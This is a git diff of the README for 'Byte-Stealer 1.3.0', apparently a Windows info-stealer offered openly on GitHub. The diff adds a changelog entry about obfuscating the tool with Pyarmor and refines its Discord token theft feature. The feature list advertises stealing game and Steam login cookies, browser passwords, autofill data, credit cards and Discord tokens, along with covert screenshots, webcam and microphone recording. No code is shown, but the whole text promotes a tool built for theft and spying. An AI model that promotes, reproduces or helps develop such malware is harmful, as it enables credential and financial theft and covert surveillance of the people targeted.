@@ -11,11 +11,10 @@ DO NOT USE LATEST RELEASE IT WILL NOT WORK, download the zip from here https://g
 [![Watch on GitHub](https://img.shields.io/github/watchers/TurtlesXD/Byte-Stealer.svg?style=social)](https://github.com/TurtlesXD/Byte-Stealer/watchers)
 [![Issues on GitHub](https://img.shields.io/github/issues/TurtlesXD/Byte-Stealer.svg?style=social)](https://github.com/TurtlesXD/Byte-Stealer/issues)
 
-Im back so expect updates
-
 # Byte-Stealer 1.3.0
 Current Update Log:
 ```
+Adding Pyarmor for obfuscation
 Fixed Geolocation bug
 Fixed Buildexe.bat not working
 Added threading for mic and video recording
@@ -35,7 +34,7 @@ Only works in windows 10/11
 • Roblox Cookie Stealer from Chrome,Opera,Firefox and Edge 🍪
 • steamLoginSecure+sessionId Token Stealer (steam login cookie) from Chrome(not a client) 🍘
 • Steal History-Bookmarks-Cookies-SavedLoginDetails-BrowserAutofill-CreditCards from basically all chromium browsers and sends them as .zip 📁
-• Steal Discord token from all types of installation 🔘 
+• Steal Discord token from all types of installation(59chars and 70chars) 🔘 
 • Auto Screenshot as .png 🖼️
 • Records 5s clip from webcam as .avi 🎥
 • Records 5s clip from mic as .wav 🎤
